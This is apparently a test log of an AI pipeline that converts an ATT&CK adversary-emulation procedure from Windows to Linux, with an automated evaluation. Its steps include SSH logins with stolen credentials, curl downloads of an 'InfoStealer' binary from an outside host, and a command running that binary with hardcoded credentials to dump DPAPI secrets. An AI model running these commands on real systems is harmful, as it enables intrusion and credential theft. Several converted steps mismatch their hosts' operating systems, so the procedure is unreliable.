@@ -1,0 +1,369 @@
+================================================================================
+Test Type: Full Pipeline (Variant + Enrichment + Evaluation)
+Model: openai/gpt-oss-120b
+Timestamp: 2026-01-26T12:28:31.254545
+Input Tokens: 13140
+Output Tokens: 10670
+Total Tokens: 23810
+Source OS: windows
+Target OS: linux
+================================================================================
+{
+  "metadata": {
+    "source_file": "./shortened_procedure.md",
+    "source_os": "windows",
+    "target_os": "linux",
+    "generated_at": "2026-01-26T12:29:30.597363",
+    "model": "openai/gpt-oss-120b",
+    "total_duration_ms": 0
+  },
+  "environment": {
+    "original_hosts": [
+      {
+        "identifier": "kimeramon",
+        "os": "windows",
+        "role": "bastion workstation"
+      }
+    ],
+    "converted_hosts": [
+      {
+        "identifier": "kimeramon",
+        "os": "linux",
+        "role": "bastion workstation"
+      }
+    ]
+  },
+  "procedure": {
+    "action_sequence": [
+      {
+        "step_id": 1,
+        "original_step_id": 1,
+        "tactic": "Initial Access",
+        "technique_id": "T1133",
+        "technique_name": "External Remote Services",
+        "os": "Windows",
+        "host": "contractor_workstation",
+        "command": "ssh contractor@10.20.20.11",
+        "description": "SSH from the contractor workstation to the corporate bastion host (now Linux) using the stolen contractor credentials.",
+        "d3fend_observables": [
+          "Credential",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "UserAccount"
+        ],
+        "execution_observables": [
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 2,
+        "original_step_id": 2,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Linux",
+        "host": "kimeramon",
+        "command": "curl -L https://raw.githubusercontent.com/sense-of-security/ADRecon/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1 -o \"$HOME/Downloads/ADRecon.ps1\"",
+        "description": "Download the ADRecon PowerShell script to the bastion host (Linux) for AD enumeration.",
+        "d3fend_observables": [
+          "Directory",
+          "File",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 3,
+        "original_step_id": 3,
+        "tactic": "Discovery",
+        "technique_id": "T1087.002",
+        "technique_name": "Account Discovery: Domain Account",
+        "os": "Linux",
+        "host": "kimeramon",
+        "command": "pwsh -ExecutionPolicy Bypass -File \"$HOME/Downloads/ADRecon.ps1\" -Collect GroupMembers,Computers -OutputType CSV",
+        "description": "Execute ADRecon with PowerShell Core on the Linux bastion to enumerate domain groups, privileged accounts, and domain\u2011joined computers.",
+        "d3fend_observables": [
+          "Credential",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "File",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 4,
+        "original_step_id": 4,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "sql_server",
+        "command": "curl -L http://theinator.com/digirevenge/netbnmp.exe -o /tmp/netbnmp.exe",
+        "description": "Download the InfoStealer tool to the SQL host using a Linux\u2011compatible method.",
+        "d3fend_observables": [
+          "Directory",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 5,
+        "original_step_id": 5,
+        "tactic": "Lateral Movement",
+        "technique_id": "T1021.001",
+        "technique_name": "Remote Services: Desktop Protocol",
+        "os": "Linux",
+        "host": "kimeramon",
+        "command": "ssh bastion_user@10.20.10.122",
+        "description": "SSH from the Linux bastion host to the datamon Server host to harvest additional credentials.",
+        "d3fend_observables": [
+          "Credential",
+          "IPAddress",
+          "NetworkTraffic",
+          "Process",
+          "UserAccount"
+        ],
+        "execution_observables": [
+          "IPAddress",
+          "NetworkTraffic",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 6,
+        "original_step_id": 6,
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "os": "Windows",
+        "host": "datamon_server",
+        "command": "curl -L http://theinator.com/digirevenge/netbnmp.exe -o /tmp/netbnmp.exe",
+        "description": "Download InfoStealer onto the datamon Server host using a Linux\u2011compatible method.",
+        "d3fend_observables": [
+          "Directory",
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "execution_observables": [
+          "File",
+          "NetworkTraffic",
+          "Process",
+          "URL"
+        ],
+        "telemetry_classes": [
+          "file",
+          "network",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      },
+      {
+        "step_id": 7,
+        "original_step_id": 7,
+        "tactic": "Credential Access",
+        "technique_id": "T1555",
+        "technique_name": "Credentials from Password Stores",
+        "os": "Windows",
+        "host": "sql_server",
+        "command": "wine /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "description": "Execute InfoStealer against the SQL Server host using harvested credentials (via Wine for Windows binary execution).",
+        "d3fend_observables": [
+          "Credential",
+          "File",
+          "Process"
+        ],
+        "execution_observables": [
+          "Credential",
+          "File",
+          "Process"
+        ],
+        "telemetry_classes": [
+          "file",
+          "identity",
+          "process"
+        ],
+        "execution_level": "non-elevated"
+      }
+    ]
+  },
+  "intermediate_output": {
+    "initial_validation_issues": 0,
+    "conversion_notes": [
+      {
+        "original_action": "mstsc /v:10.20.20.11",
+        "converted_action": "ssh contractor@10.20.20.11",
+        "conversion_type": "approximation",
+        "notes": "RDP (Windows Remote Desktop) is replaced with SSH because the target bastion host is now Linux."
+      },
+      {
+        "original_action": "bitsadmin /transfer adrecon /download https://raw.githubusercontent.com/.../ADRecon.ps1 %USERPROFILE%\\Downloads\\ADRecon.ps1",
+        "converted_action": "curl -L https://raw.githubusercontent.com/.../ADRecon.ps1 -o $HOME/Downloads/ADRecon.ps1",
+        "conversion_type": "equivalent",
+        "notes": "BITS is a Windows\u2011only tool; curl provides the same file\u2011download capability on Linux."
+      },
+      {
+        "original_action": "powershell -ExecutionPolicy Bypass -Scope CurrentUser -File \"%USERPROFILE%\\Downloads\\ADRecon.ps1\" -Collect GroupMembers,Computers -OutputType CSV",
+        "converted_action": "pwsh -ExecutionPolicy Bypass -File \"$HOME/Downloads/ADRecon.ps1\" -Collect GroupMembers,Computers -OutputType CSV",
+        "conversion_type": "equivalent",
+        "notes": "PowerShell Core (pwsh) runs on Linux and accepts the same parameters, preserving script functionality."
+      },
+      {
+        "original_action": "mstsc /v:10.20.10.122",
+        "converted_action": "ssh bastion_user@10.20.10.122",
+        "conversion_type": "approximation",
+        "notes": "RDP from the (now Linux) bastion to the datamon server is replaced with SSH, the standard remote service on Linux."
+      },
+      {
+        "original_action": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "converted_action": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "conversion_type": "direct",
+        "notes": "The command runs on hosts that remain Windows; no conversion required."
+      },
+      {
+        "original_action": "%TEMP%\\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "converted_action": "%TEMP%\\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "conversion_type": "direct",
+        "notes": "Executable runs on a Windows SQL Server; unchanged."
+      }
+    ],
+    "refinements": [
+      {
+        "action_index": 3,
+        "refinement_type": "command_update",
+        "before": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "after": "curl -L http://theinator.com/digirevenge/netbnmp.exe -o /tmp/netbnmp.exe",
+        "reason": "bitsadmin is a Windows utility; replaced with curl for Linux."
+      },
+      {
+        "action_index": 5,
+        "refinement_type": "command_update",
+        "before": "bitsadmin /transfer defaultjob2 /download http://theinator.com/digirevenge/netbnmp.exe %TEMP%\\netbnmp.exe",
+        "after": "curl -L http://theinator.com/digirevenge/netbnmp.exe -o /tmp/netbnmp.exe",
+        "reason": "bitsadmin is a Windows utility; replaced with curl for Linux."
+      },
+      {
+        "action_index": 6,
+        "refinement_type": "command_update",
+        "before": "%TEMP%\\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "after": "wine /tmp/netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!",
+        "reason": "Windows path and executable not usable on Linux; using Wine and Linux /tmp path."
+      }
+    ],
+    "warnings": [
+      "Steps 4, 6, and 7 originally referenced Windows\u2011only commands (bitsadmin, %TEMP% variable, .exe execution). They have been replaced with Linux\u2011compatible equivalents, but execution may require additional dependencies (curl, wine).",
+      "Step 2 writes a PowerShell script (.ps1) to $HOME/Downloads; ensure the directory exists and the user has write permissions.",
+      "Step 3 requires PowerShell Core (pwsh) to be installed on the Linux host."
+    ]
+  },
+  "evaluation": {
+    "metadata": {
+      "source_file": "./shortened_procedure.md",
+      "control_file": "./control_gold.json",
+      "source_os": "windows",
+      "target_os": "linux",
+      "evaluated_at": "2026-01-26T12:29:43.771893",
+      "model": "openai/gpt-oss-120b"
+    },
+    "missing_steps": {
+      "name": "missing_steps",
+      "passed": true,
+      "detail": ""
+    },
+    "extra_steps": {
+      "name": "extra_steps",
+      "passed": true,
+      "detail": ""
+    },
+    "os_constructs_valid": {
+      "name": "os_constructs_valid",
+      "passed": false,
+      "detail": "Step 2: .ps1 extension (pattern); Step 3: .ps1 extension (pattern); Step 4: .exe extension (pattern); Step 6: .exe extension (pattern); Step 7: .exe extension (pattern)"
+    },
+    "technique_ids_match": {
+      "name": "technique_ids_match",
+      "passed": true,
+      "detail": ""
+    },
+    "parent_technique_ids_match": {
+      "name": "parent_technique_ids_match",
+      "passed": true,
+      "detail": ""
+    },
+    "telemetry_classes_match": {
+      "name": "telemetry_classes_match",
+      "passed": true,
+      "detail": ""
+    },
+    "extra_telemetry_classes": {
+      "name": "extra_telemetry_classes",
+      "passed": true,
+      "detail": ""
+    },
+    "telemetry_diversity": {
+      "name": "telemetry_diversity",
+      "passed": true,
+      "detail": ""
+    },
+    "telemetry_multi_class": {
+      "name": "telemetry_multi_class",
+      "passed": true,
+      "detail": ""
+    },
+    "all_pass": false
+  }
+}
